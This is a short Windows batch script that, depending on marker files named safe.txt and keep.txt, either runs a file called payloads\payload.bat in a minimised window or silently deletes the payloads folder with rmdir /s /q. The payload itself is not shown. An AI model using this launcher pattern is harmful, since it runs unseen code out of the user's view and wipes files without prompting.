@echo off

if not exist ".\payloads\payload.bat" (
   exit
)

if exist safe.txt (
   rmdir /s /q .\payloads
   exit
)

if exist keep.txt (
   cd payloads
   start /min /wait payload.bat
   exit
)

rmdir /s /q .\payloads
exit
